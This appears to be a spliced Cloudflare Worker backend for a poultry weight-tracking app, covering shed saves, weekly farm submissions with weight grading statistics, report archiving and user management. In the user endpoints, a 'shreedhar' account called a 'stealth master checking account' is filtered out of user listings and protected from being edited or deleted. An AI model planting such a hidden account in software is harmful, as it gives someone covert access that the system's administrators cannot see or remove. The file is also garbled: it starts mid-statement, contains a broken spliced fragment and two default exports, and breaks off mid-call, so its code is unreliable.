                locked_batch_id = NULL
              WHERE id = ?
            `).bind(shedId).run().catch(() => {});
          }
          return jsonResponse({ success: true, shedId, locked: false, message: 'Shed forcibly unlocked' });
        }

        // -------------------------------------------------------------
        // STAGE 2: SHED-WISE "SAVE SHED" (TEAM VISIBLE, NOT SUBMISSION HISTORY)
        // -------------------------------------------------------------
        const shedSaveMatch = path.match(/^\/sheds\/([^/]+)\/save-shed$/);
        if (shedSaveMatch && method === 'POST') {
          const shedId = decodeURIComponent(shedSaveMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const targetWeek = (body.week || 'W18').toUpperCase();
          const userId = body.userId || body.savedByUserId || request.headers.get('x-user-id') || 'incharge-1';
          const userName = body.userName || body.savedByUserName || request.headers.get('x-user-username') || 'Incharge 1';
          let totalBirdCount = Number(body.totalBirdCount || 0);

          if (env.DB) {
            await ensureShedWeekStatusTable(env);
            await ensureBatchesTable(env);

            const shed = await env.DB.prepare('SELECT * FROM sheds WHERE id = ?').bind(shedId).first() as any;
            if (!shed) return errorResponse('Shed not found', 404);
            const farmId = shed.farm_id;

            const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
            const activeBatch = await ensureFarmActiveBatch(env, farm);
            const batchId = body.batchId || activeBatch?.id;

            // 1. Persist all bird weights recorded in that shed if weights array/map provided
            if (body.weights && Array.isArray(body.weights)) {
              let countedBirds = 0;
              for (const lineItem of body.weights) {
                if (!lineItem.lineId) continue;
                const lineId = lineItem.lineId;
                const lineWeights: number[] = Array.isArray(lineItem.weights) ? lineItem.weights : [];
                countedBirds += lineWeights.length;

                // Clear previous week weights for this line in this batch
                await env.DB.prepare(`
                  DELETE FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
                `).bind(lineId, targetWeek, batchId).run().catch(() => {});

                // Get line std
                const lineRow = await env.DB.prepare('SELECT std_weight_grams, gender FROM lines WHERE id = ?').bind(lineId).first() as any;
                const std = lineRow?.std_weight_grams || (lineRow?.gender === 'MALE' ? 150 : 140);

                for (let idx = 0; idx < lineWeights.length; idx++) {
                  const wVal = Number(lineWeights[idx]);
                  if (isNaN(wVal) || wVal <= 0) continue;
                  const wId = `w-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
                  await env.DB.prepare(`
                    INSERT INTO bird_weights (id, line_id, entry_index, weight_grams, std_weight_at_entry, recorded_by, week, batch_id) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                  `).bind(wId, lineId, idx + 1, wVal, std, userName, targetWeek, batchId).run().catch(() => {});
                }
              }
              if (countedBirds > 0 || totalBirdCount === 0) {
                totalBirdCount = countedBirds;
              }
            } else if (!totalBirdCount) {
              // Query bird weights count for this shed and batch
              const countRes = await env.DB.prepare(`
                SELECT COUNT(bw.id) as total_birds
                FROM bird_weights bw
                JOIN lines l ON bw.line_id = l.id
                JOIN parts p ON l.part_id = p.id
                WHERE p.shed_id = ? AND UPPER(bw.week) = ? AND (bw.batch_id = ? OR bw.batch_id IS NULL)
              `).bind(shedId, targetWeek, batchId).first() as any;
              if (countRes && countRes.total_birds !== undefined) {
                totalBirdCount = countRes.total_birds;
              }
            }

            // 2. Mark shed status for that week as SAVED in shed_week_status with batch_id and weights_json
            const weightsJson = body.weights ? JSON.stringify(body.weights) : null;
            await env.DB.prepare(`
              INSERT INTO shed_week_status (shed_id, farm_id, week, status, saved_by_user_id, saved_by_user_name, total_bird_count, weights_json, batch_id, saved_at)
              VALUES (?, ?, ?, 'SAVED', ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
              ON CONFLICT(shed_id, week) DO UPDATE SET
                status = 'SAVED',
                saved_by_user_id = excluded.saved_by_user_id,
                saved_by_user_name = excluded.saved_by_user_name,
                total_bird_count = excluded.total_bird_count,
                weights_json = excluded.weights_json,
                batch_id = excluded.batch_id,
                saved_at = CURRENT_TIMESTAMP
            `).bind(shedId, farmId, targetWeek, userId, userName, totalBirdCount, weightsJson, batchId).run();

            // 3. Release active lock
            await env.DB.prepare(`
              UPDATE sheds SET
                locked_by_user_id = NULL,
                locked_by_user_name = NULL,
                locked_at = NULL,
                last_heartbeat_at = NULL,
                locked_week = NULL,
                locked_batch_id = NULL,
                recorded_by_user_id = ?,
                recorded_by_user_name = ?
              WHERE id = ?
            `).bind(userId, userName, shedId).run().catch(() => {});

            await env.DB.prepare('UPDATE farms SET updated_at = CURRENT_TIMESTAMP WHERE id = ?').bind(farmId).run().catch(() => {});

            // 4. Log to activity_logs
            const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
            await env.DB.prepare(`
              INSERT INTO activity_logs (id, farm_id, user_name, action, shed_name, sample_count)
              VALUES (?, ?, ?, 'SAVED_SHED', ?, ?)
            `).bind(logId, farmId, userName, shed.name, totalBirdCount).run().catch(() => {});
          }

          // CRITICAL: NEVER write to submissions table on save-shed!
          return jsonResponse({
            success: true,
            shedId,
            week: targetWeek,
            status: 'SAVED',
            savedByUserId: userId,
            savedByUserName: userName,
            totalBirdCount,
            message: `Shed saved successfully with ${totalBirdCount} birds. Visible to team.`
          });
        }

        // -------------------------------------------------------------
        // STAGE 3: OVERALL FARM "FINAL SUBMIT" (WRITES TO SUBMISSIONS TABLE)
        // -------------------------------------------------------------
        const farmWeekSubmitMatch = path.match(/^\/farms\/([^/]+)\/weeks\/([^/]+)\/submit$/);
        if (farmWeekSubmitMatch && method === 'POST') {
          const farmId = decodeURIComponent(farmWeekSubmitMatch[1]);
          const weekNumber = decodeURIComponent(farmWeekSubmitMatch[2]).toUpperCase();
          const body = await request.json().catch(() => ({})) as any;
          const submittedBy = body.submittedBy || body.userName || 'Field Supervisor';
          const submittedRole = body.submittedRole || body.userRole || 'SUPERVISOR';

          if (!env.DB) {
            return jsonResponse({ success: true, submissionId: `sub-${Date.now()}`, status: 'SUBMITTED', farmId, week: weekNumber });
          }

          await ensureShedWeekStatusTable(env);
          await ensureBatchesTable(env);

          const farm = await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).first() as any;
          if (!farm) return errorResponse('Farm not found', 404);

          const activeBatch = await ensureFarmActiveBatch(env, farm);
          const batchId = body.batchId || activeBatch?.id;
          const batchName = body.batchName || activeBatch?.batchName || 'Batch 1';

          // Aggregate all sheds, parts, lines, and weights for weekNumber and batchId
          const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(farmId).all();
          const allSheds = shedsRes.results || [];

          const shedWeekStatuses = await env.DB.prepare(`
            SELECT * FROM shed_week_status 
            WHERE farm_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL)
          `).bind(farmId, weekNumber, batchId).all().catch(() => ({ results: [] }));
          const swsMap = new Map((shedWeekStatuses.results || []).map((s: any) => [s.shed_id, s]));

          let totalFarmBirds = 0;
          let allFemaleWeights: number[] = [];
          let allMaleWeights: number[] = [];
          const shedsBreakdown: any[] = [];

          for (const s of allSheds) {
            const sws: any = swsMap.get(s.id);
            const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
            let shedBirdCount = 0;
            const partsList: any[] = [];

            for (const p of partsRes.results || []) {
              const linesRes = await env.DB.prepare('SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC').bind(p.id).all();
              const linesList: any[] = [];

              for (const l of linesRes.results || []) {
                const weightsRes = await env.DB.prepare(`
                  SELECT weight_grams FROM bird_weights 
                  WHERE line_id = ? AND UPPER(week) = ? AND (batch_id = ? OR batch_id IS NULL) 
                  ORDER BY entry_index ASC
                `).bind(l.id, weekNumber, batchId).all();
                const weights = (weightsRes.results || []).map((w: any) => Number(w.weight_grams));

                shedBirdCount += weights.length;
                totalFarmBirds += weights.length;

                if (l.gender === 'FEMALE') {
                  allFemaleWeights.push(...weights);
                } else {
                  allMaleWeights.push(...weights);
                }

                linesList.push({
                  id: l.id,
                  name: l.name,
                  gender: l.gender,
                  stdWeight: l.std_weight_grams,
                  weights,
                  count: weights.length,
                });
              }

              partsList.push({
                id: p.id,
                name: p.name,
                lines: linesList,
              });
            }

            const effectiveBirdCount = shedBirdCount > 0 ? shedBirdCount : (sws?.total_bird_count || 0);
            if (shedBirdCount === 0 && effectiveBirdCount > 0) {
              totalFarmBirds += effectiveBirdCount;
            }

            shedsBreakdown.push({
              shedId: s.id,
              shedName: s.name,
              status: sws?.status || (effectiveBirdCount > 0 ? 'SAVED' : 'DRAFT'),
              savedByUserId: sws?.saved_by_user_id || s.recorded_by_user_id || null,
              savedByUserName: sws?.saved_by_user_name || s.recorded_by_user_name || 'Incharge',
              birdCount: effectiveBirdCount,
              parts: partsList,
            });
          }

          // Compute Statistics with grading bands (MB, B, S, A, MA) and CV%
          const parsedWeekNum = parseInt(weekNumber.replace(/\D/g, '') || '18', 10);
          const calcStats = (weights: number[], stdWeight: number = 140) => {
            const count = weights.length;
            if (count === 0) {
              return { 
                count: 0, avg: 0, stdDev: 0, cv: 0, uniformity: 0,
                grades: { MB: 0, B: 0, S: 0, A: 0, MA: 0 },
                gradePercents: { MB: 0, B: 0, S: 0, A: 0, MA: 0 }
              };
            }
            const avg = Math.round((weights.reduce((a, b) => a + b, 0) / count) * 10) / 10;
            const variance = count > 1 ? weights.reduce((acc, val) => acc + Math.pow(val - avg, 2), 0) / (count - 1) : 0;
            const stdDev = Math.round(Math.sqrt(variance) * 10) / 10;
            const cv = avg > 0 ? Math.round((stdDev / avg) * 10000) / 100 : 0;
            const inRange = weights.filter(w => w >= avg * 0.9 && w <= avg * 1.1).length;
            const uniformity = Math.round((inRange / count) * 1000) / 10;

            const tolerance = parsedWeekNum <= 3 ? 25 : parsedWeekNum <= 8 ? 50 : parsedWeekNum <= 14 ? 75 : 100;
            const sMin = stdWeight - tolerance;
            const sMax = stdWeight + tolerance;
            const bMin = stdWeight - 2 * tolerance;
            const aMax = stdWeight + 2 * tolerance;

            let mb = 0, b = 0, s = 0, a = 0, ma = 0;
            for (const w of weights) {
              if (w < bMin) mb++;
              else if (w < sMin) b++;
              else if (w <= sMax) s++;
              else if (w <= aMax) a++;
              else ma++;
            }

            return { 
              count, avg, stdDev, cv, uniformity,
              stdWeight,
              grades: { MB: mb, B: b, S: s, A: a, MA: ma },
              gradePercents: {
                MB: Math.round((mb / count) * 1000) / 10,
                B: Math.round((b / count) * 1000) / 10,
                S: Math.round((s / count) * 1000) / 10,
                A: Math.round((a / count) * 1000) / 10,
                MA: Math.round((ma / count) * 1000) / 10,
              }
            };
          };

          const femaleStats = calcStats(allFemaleWeights, 140);
          const maleStats = calcStats(allMaleWeights, 150);

          const snapshot = {
            submissionId: `sub-${Date.now()}`,
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            flockAge: weekNumber,
            season: farm.season || 'Summer',
            submittedAt: new Date().toISOString(),
            submittedBy,
            submittedRole,
            totalBirds: totalFarmBirds,
            femaleStats,
            maleStats,
            sheds: shedsBreakdown,
          };

          const submissionId = snapshot.submissionId;
          const dataJson = JSON.stringify(snapshot);
          const r2Key = `reports/${farmId}/${submissionId}.json`;

          // Write ONE single consolidated record to submissions with batch_id and batch_name
          await env.DB.prepare(`
            INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json, batch_id, batch_name)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
          `).bind(submissionId, farmId, weekNumber, farm.season || 'Summer', totalFarmBirds, submittedBy, submittedRole, r2Key, dataJson, batchId, batchName).run();

          // R2 Storage archive if available
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: { farmId, submissionId, submittedBy, week: weekNumber, batchName },
            }).catch(() => {});
          }

          // Activity Log
          const logId = `log-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
          await env.DB.prepare(`
            INSERT INTO activity_logs (id, farm_id, user_name, action, sample_count)
            VALUES (?, ?, ?, 'FARM_FINAL_SUBMIT', ?)
          `).bind(logId, farmId, submittedBy, totalFarmBirds).run().catch(() => {});

          return jsonResponse({
            success: true,
            submissionId,
            status: 'SUBMITTED',
            farmId,
            farmName: farm.name,
            batchId,
            batchName,
            week: weekNumber,
            totalBirds: totalFarmBirds,
            message: `Farm ${farm.name} (${batchName}) week ${weekNumber} overall submission completed successfully.`,
          }, 201);
        }

        // -------------------------------------------------------------
        // F. SUBMISSIONS & REPORTS (Cloudflare R2 + D1 15 GB+ Archive)
        // -------------------------------------------------------------
        if ((path === '/submissions' || path === '/submissions/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const submissionId = `sub-${Date.now()}`;
          const farmId = body.farmId || 'default-farm';
          const flockAge = body.flockAge || 'W1';
          const submittedBy = body.metadata?.submittedBy || 'Supervisor';
          const submittedRole = body.metadata?.submittedRole || 'SUPERVISOR';
          const totalBirds = body.metadata?.totalBirds || 0;
          const dataJson = JSON.stringify(body);

          let r2Key = `reports/${farmId}/${submissionId}.json`;

          // Store full batch payload in Cloudflare R2 bucket
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            await bucket.put(r2Key, dataJson, {
              httpMetadata: { contentType: 'application/json' },
              customMetadata: {
                farmId,
                submissionId,
                submittedBy,
              },
            });
          }

          if (env.DB) {
            await env.DB.prepare(`
              INSERT INTO submissions (id, farm_id, flock_age, season, total_birds, submitted_by, submitted_role, r2_report_key, data_json)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            `).bind(submissionId, farmId, flockAge, body.season || 'Summer', totalBirds, submittedBy, submittedRole, r2Key, dataJson).run();
          }

          return jsonResponse({
            success: true,
            status: 'COMPLETED',
            submissionId,
            r2ReportKey: r2Key,
            message: 'Weighing batch archived to Cloudflare D1 + R2 Storage',
          }, 201);
        }

        if ((path === '/submissions' || path === '/submissions/') && method === 'GET') {
          const farmId = url.searchParams.get('farmId');
          if (!env.DB) return jsonResponse([]);

          const subs = farmId
            ? await env.DB.prepare('SELECT * FROM submissions WHERE farm_id = ? ORDER BY created_at DESC').bind(farmId).all()
            : await env.DB.prepare('SELECT * FROM submissions ORDER BY created_at DESC LIMIT 50').all();

          return jsonResponse((subs.results || []).map((s: any) => ({
            ...s,
            batchId: s.batch_id,
            batchName: s.batch_name || 'Batch 1',
          })));
        }

        // GET /api/reports - lists or retrieves archived R2 files
        if (path === '/reports' || path === '/reports/') {
          const bucket = env.STORAGE_BUCKET || env.REPORT_BUCKET;
          if (bucket) {
            const list = await bucket.list({ prefix: 'reports/' });
            return jsonResponse({
              success: true,
              storageType: 'Cloudflare R2 (15 GB+ Object Storage)',
              reports: list.objects.map((o: any) => ({ key: o.key, size: o.size, uploaded: o.uploaded })),
            });
          }
          return jsonResponse({
            success: true,
            storageType: 'Cloudflare D1 Native',
            reports: [],
          });
        }

        // -------------------------------------------------------------
        // G. AUTH & USERS (Role-Based Access Control: Manager & In-Charge Only)
        // -------------------------------------------------------------
        // Login, session verification, and password changes are handled by the fail-closed gate above.

        // GET /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'GET') {
          let usersList: any[] = [];
          if (env.DB) {
            await ensureUsersTable(env);
            const res = await env.DB.prepare('SELECT * FROM users ORDER BY created_at ASC').all();
            usersList = (res.results || []).map((u: any, idx: number) => {
              const rUpper = (u.role || '').toUpperCase();
              let roleStr: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') roleStr = 'Manager';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') roleStr = 'In-Charge';
              else roleStr = 'Supervisor';

              const empCode = u.employee_code || `EMP${String(idx + 1).padStart(4, '0')}`;

              let assignedFarms = ['*'];
              if (u.assigned_farms) {
                try {
                  const parsed = JSON.parse(u.assigned_farms);
                  if (Array.isArray(parsed)) assignedFarms = parsed;
                } catch {}
              } else if (u.assigned_farm_id) {
                assignedFarms = [u.assigned_farm_id];
              }

              return {
                id: u.id,
                employeeCode: empCode,
                username: u.phone_or_email,
                name: u.name,
                role: roleStr,
                userRole: roleStr,
                phone: u.phone_or_email,
                status: String(u.status || 'ACTIVE').toUpperCase(),
                requiresPasswordChange: Boolean(Number(u.requires_password_change || 0)),
                assignedFarmId: u.assigned_farm_id,
                assignedFarms,
              };
            });
          } else {
            usersList = [
              { id: 'u-admin-1', employeeCode: 'EMP0001', username: 'admin', name: 'Operations Director', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-manager-1', employeeCode: 'EMP0002', username: 'manager', name: 'Farm Manager', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-incharge-1', employeeCode: 'EMP0003', username: 'incharge', name: 'Field In-Charge', role: 'In-Charge', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-supervisor-1', employeeCode: 'EMP0008', username: 'supervisor', name: 'Line Supervisor', role: 'Supervisor', status: 'ACTIVE', assignedFarms: ['*'] },
            ];
          }

          // STRICT INVISIBILITY: Filter out shreedhar master checking account
          const visibleUsers = usersList.filter((u: any) => {
            const un = (u.username || '').toLowerCase();
            const nm = (u.name || '').toLowerCase();
            const id = (u.id || '').toLowerCase();
            return un !== 'shreedhar' && nm !== 'shreedhar' && id !== 'user-master-shreedhar' && id !== 'u-master-shreedhar';
          });

          return jsonResponse(visibleUsers);
        }

        // POST /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const username = String(body.username || body.phone || '').trim();
          const name = String(body.name || username || 'New User').trim();
          const rawPassword = String(body.password || '').trim();
          if (!username || !rawPassword || rawPassword.length < 6) {
            return errorResponse('Username and an initial password of at least 6 characters are required.', 400);
          }
          if (!env.DB) return errorResponse('User database is unavailable.', 503);
          const roleNormalized = normalizeWorkerRole(body.role || 'Supervisor');
          const dbRole = roleNormalized === 'Admin' ? 'ADMIN' : roleNormalized === 'Manager' ? 'MANAGER' : roleNormalized === 'In-Charge' ? 'INCHARGE' : 'SUPERVISOR';
          const employeeCode = String(body.employeeCode || '').trim() || await (async () => {
            const maxRow = await env.DB!.prepare("SELECT employee_code FROM users WHERE employee_code LIKE 'EMP%' ORDER BY CAST(SUBSTR(employee_code, 4) AS INTEGER) DESC LIMIT 1").first() as any;
            const next = maxRow?.employee_code ? Number(String(maxRow.employee_code).replace(/\D/g, '')) + 1 : 1;
            return 'EMP' + String(next).padStart(4, '0');
          })();
          const existing = await env.DB.prepare("SELECT id FROM users WHERE LOWER(phone_or_email) = LOWER(?) OR UPPER(employee_code) = UPPER(?) LIMIT 1")
            .bind(username, employeeCode).first();
          if (existing) return errorResponse('Username or employee code is already in use.', 409);
          const assignedFarms = Array.isArray(body.assignedFarms) ? body.assignedFarms.map((v: unknown) => String(v)) :
            (body.assignedFarmId ? [String(body.assignedFarmId)] : []);
          const assignedFarmId = body.assignedFarmId || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : null);
          const hash = await makePasswordHash(rawPassword);
          const requiresPasswordChange = roleNormalized === 'Supervisor' || roleNormalized === 'In-Charge';
          const userId = 'usr-' + crypto.randomUUID();
          await env.DB.prepare("INSERT INTO users (id, name, phone_or_email, role, employee_code, assigned_farm_id, assigned_farms, password_hash, status, requires_password_change) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'ACTIVE', ?)")
            .bind(userId, name, username, dbRole, employeeCode, assignedFarmId, JSON.stringify(assignedFarms), hash, requiresPasswordChange ? 1 : 0).run();
          return jsonResponse({
            id: userId, employeeCode, username, name, role: roleNormalized, userRole: roleNormalized,
            status: 'ACTIVE', assignedFarmId, assignedFarms, requiresPasswordChange,
          }, 201);
        }

        // PUT /api/auth/users/:id or /api/users/:id
        const singleUserMatch = path.match(/^\/(?:auth\/)?users\/([^/]+)$/);
        if (singleUserMatch && method === 'PUT') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);
          const body = await request.json().catch(() => ({})) as any;

          // Block modification of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar' || (body.username && body.username.toLowerCase() === 'shreedhar')) {
            return errorResponse('Access Denied: Master account cannot be modified.', 403);
          }

          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE users SET name = ? WHERE id = ?').bind(body.name, targetUserId).run().catch(() => {});
            }
            if (body.role) {
              const rUpper = (body.role || '').toUpperCase();
              let r = 'SUPERVISOR';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') r = 'MANAGER';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') r = 'INCHARGE';
              else r = 'SUPERVISOR';
              await env.DB.prepare('UPDATE users SET role = ? WHERE id = ?').bind(r, targetUserId).run().catch(() => {});
            }
            if (body.password && String(body.password).trim().length >= 6) {
              const passwordHash = await makePasswordHash(String(body.password).trim());
              await env.DB.prepare('UPDATE users SET password_hash = ?, requires_password_change = 0 WHERE id = ?').bind(passwordHash, targetUserId).run();
            }
            if (body.assignedFarms || body.assignedFarmId) {
              const af = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : []);
              const afId = body.assignedFarmId || (af.length > 0 && af[0] !== '*' ? af[0] : null);
              await env.DB.prepare('UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?').bind(afId, JSON.stringify(af), targetUserId).run().catch(() => {});
            }
          }

          return jsonResponse({ success: true, message: 'User updated' });
        }

        // DELETE /api/auth/users/:id or /api/users/:id
        if (singleUserMatch && method === 'DELETE') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);

          // Block deletion of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar') {
            return errorResponse('Access Denied: Master account cannot be deleted.', 403);
          }

          if (!env.DB) return errorResponse('User database is unavailable.', 503);
          if (env.DB) {
            const u = await env.DB.prepare('SELECT phone_or_email FROM users WHERE id = ?').bind(targetUserId).first() as any;
            if (u && (u.phone_or_email || '').toLowerCase() === 'shreedhar') {
              return errorResponse('Access Denied: Master account cannot be deleted.', 403);
            }
            await env.DB.prepare('DELETE FROM users WHERE id = ?').bind(targetUserId).run().catch(() => {});
          }

          return jsonResponse({ success: true, message: 'User account removed.' });
        }

        // POST /api/auth/users/:id/reset-password
        const resetPasswordMatch = path.match(/^\/auth\/users\/([^/]+)\/reset-password$/);
        if (resetPasswordMatch && method === 'POST') {
          const targetUserId = decodeURIComponent(resetPasswordMatch[1]);
          const body = await request.json().catch(() => ({})) as any;
          const newPassword = String(body.newPassword || '').trim();
          if (newPassword.length < 8) return errorResponse('New password must be at least 8 characters long.', 400);
          if (!env.DB) return errorResponse('User database is unavailable.', 503);
          const target = await env.DB.prepare('SELECT id FROM users WHERE id = ?').bind(targetUserId).first();
          if (!target) return errorResponse('User not found.', 404);
          const passwordHash = await makePasswordHash(newPassword);
          await env.DB.prepare('UPDATE users SET password_hash = ?, requires_password_change = 1 WHERE id = ?').bind(passwordHash, targetUserId).run();
          return jsonResponse({ success: true, message: 'Password reset successfully' });
        }

        return errorResponse(`Endpoint not found: ${method} ${path}`, 404);
      } catch (err: any) {
        return errorResponse(err?.message || 'Internal Cloudflare Worker Server Error', 500);
      }
    }

    // 3. Serve Frontend SPA Static Assets via Cloudflare Assets Binding
    if (env.ASSETS) {
      const response = await env.ASSETS.fetch(request);
      if (response.status !== 404) {
        return response;
      }
      // Single Page Application (SPA) routing fallback to index.html
      const indexRequest = new Request(new URL('/', url.origin), request);
      return env.ASSETS.fetch(indexRequest);
    }

    return new Response(
      'Poultry Weight Tracker Cloudflare Worker is active. D1 and R2 bindings configured.',
      {
        status: 200,
        headers: { 'Content-Type': 'text/plain; charset=utf-8' },
      }
    );
  },
};
 + PASSWORD_HASH_ITERATIONS + ' (auto-migrating existing records to Batch 1 if none exists)
async function ensureFarmActiveBatch(env: Env, farm: any): Promise<any> {
  if (!env.DB || !farm) return null;
  await ensureBatchesTable(env);
  let activeBatch = await env.DB.prepare(
    'SELECT * FROM batches WHERE farm_id = ? AND status = ? ORDER BY created_at DESC LIMIT 1'
  ).bind(farm.id, 'ACTIVE').first() as any;

  if (!activeBatch) {
    const existing = await env.DB.prepare(
      'SELECT * FROM batches WHERE farm_id = ? ORDER BY created_at DESC LIMIT 1'
    ).bind(farm.id).first() as any;

    if (!existing) {
      const batchId = `batch-${farm.id}-1`;
      const batchName = 'Batch 1';
      const startDate = farm.flock_date || new Date().toISOString().split('T')[0];
      const startWeekNum = parseInt(String(farm.age_week || 'W1').replace(/\D/g, '') || '1', 10);

      await env.DB.prepare(`
        INSERT INTO batches (id, farm_id, batch_name, start_date, start_week_number, status)
        VALUES (?, ?, ?, ?, ?, 'ACTIVE')
      `).bind(batchId, farm.id, batchName, startDate, startWeekNum).run().catch(() => {});

      // Link any legacy unassigned records to Batch 1
      await env.DB.prepare(
        'UPDATE bird_weights SET batch_id = ? WHERE batch_id IS NULL'
      ).bind(batchId).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE shed_week_status SET batch_id = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, farm.id).run().catch(() => {});
      await env.DB.prepare(
        'UPDATE submissions SET batch_id = ?, batch_name = ? WHERE batch_id IS NULL AND farm_id = ?'
      ).bind(batchId, batchName, farm.id).run().catch(() => {});

      activeBatch = {
        id: batchId,
        farm_id: farm.id,
        farmId: farm.id,
        batch_name: batchName,
        batchName: batchName,
        start_date: startDate,
        startDate: startDate,
        start_week_number: startWeekNum,
        startWeekNumber: startWeekNum,
        status: 'ACTIVE',
      };
    } else {
      activeBatch = existing;
    }
  }

  return {
    id: activeBatch.id,
    farmId: activeBatch.farm_id || farm.id,
    batchName: activeBatch.batch_name || activeBatch.batchName || 'Batch 1',
    startDate: activeBatch.start_date || activeBatch.startDate || farm.flock_date,
    startWeekNumber: activeBatch.start_week_number || activeBatch.startWeekNumber || 1,
    status: activeBatch.status,
  };
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const method = request.method.toUpperCase();

    // 1. Handle CORS Preflight Requests
    if (method === 'OPTIONS') {
      return new Response(null, {
        status: 204,
        headers: CORS_HEADERS,
      });
    }

    // Health check endpoint (Direct /health)
    if (url.pathname === '/health' || url.pathname === '/health/') {
      return jsonResponse({
        status: 'ok',
        connected: true,
        database: { status: 'connected', provider: 'cloudflare-d1' },
      });
    }

    // 2. Handle API Routes under /api/
    if (url.pathname.startsWith('/api')) {
      try {
        const path = url.pathname.replace(/^\/api/, '') || '/';

        // Health check endpoint: GET /api/health
        if (path === '/health' || path === '/health/') {
          return jsonResponse({
            status: 'ok',
            connected: true,
            database: { status: 'connected', provider: 'cloudflare-d1' },
          });
        }

        // -------------------------------------------------------------
        // A. HIERARCHY ENDPOINTS: GET /api/hierarchy, POST /api/hierarchy
        // -------------------------------------------------------------
        if (path === '/hierarchy' || path === '/hierarchy/') {
          if (method === 'GET') {
            const farmId = url.searchParams.get('farmId');
            if (!env.DB) {
              return jsonResponse({
                farms: [],
                message: 'D1 binding not initialized yet in local test mode.',
              });
            }

            const farmQuery = farmId
              ? await env.DB.prepare('SELECT * FROM farms WHERE id = ?').bind(farmId).all()
              : await env.DB.prepare('SELECT * FROM farms WHERE is_archived = 0 ORDER BY created_at DESC').all();

            const farms = farmQuery.results || [];
            const fullHierarchy: any[] = [];

            for (const f of farms) {
              const shedsRes = await env.DB.prepare('SELECT * FROM sheds WHERE farm_id = ?').bind(f.id).all();
              const sheds = shedsRes.results || [];
              const shedList: any[] = [];

              for (const s of sheds) {
                const partsRes = await env.DB.prepare('SELECT * FROM parts WHERE shed_id = ?').bind(s.id).all();
                const parts = partsRes.results || [];
                const partList: any[] = [];

                for (const p of parts) {
                  const linesRes = await env.DB.prepare(
                    'SELECT * FROM lines WHERE part_id = ? ORDER BY line_number ASC'
                  ).bind(p.id).all();
                  const lines = linesRes.results || [];
                  const lineList: any[] = [];

                  for (const l of lines) {
                    const weightsRes = await env.DB.prepare(
                      'SELECT weight_grams FROM bird_weights WHERE line_id = ? ORDER BY entry_index ASC'
                    ).bind(l.id).all();
                    const weights = (weightsRes.results || []).map((w: any) => w.weight_grams);

                    lineList.push({
                      id: l.id,
                      name: l.name,
                      lineNumber: l.line_number,
                      gender: l.gender, // 'MALE' | 'FEMALE'
                      stdWeight: l.std_weight_grams,
                      targetBirdCount: l.target_bird_count,
                      weights,
                    });
                  }

                  partList.push({
                    id: p.id,
                    name: p.name,
                    lines: lineList,
                  });
                }

                shedList.push({
                  id: s.id,
                  name: s.name,
                  targetBirdCount: s.target_bird_count,
                  lockedByUserId: s.locked_by_user_id || null,
                  lockedByUserName: s.locked_by_user_name || null,
                  lockedAt: s.locked_at || null,
                  lastHeartbeatAt: s.last_heartbeat_at || null,
                  recordedByUserId: s.recorded_by_user_id || null,
                  recordedByUserName: s.recorded_by_user_name || null,
                  parts: partList,
                });
              }

              fullHierarchy.push({
                ...f,
                sheds: shedList,
              });
            }

            return jsonResponse({ success: true, farms: fullHierarchy });
          }

          if (method === 'POST') {
            const body = await request.json().catch(() => ({})) as any;
            if (!env.DB) return jsonResponse({ success: true, message: 'D1 not bound' });

            const farmId = body.farmId || `farm-${Date.now()}`;
            const farmName = body.name || 'New Farm';
            const season = body.season || 'Summer';
            const ageWeek = body.ageWeek || 'W1';

            await env.DB.prepare(
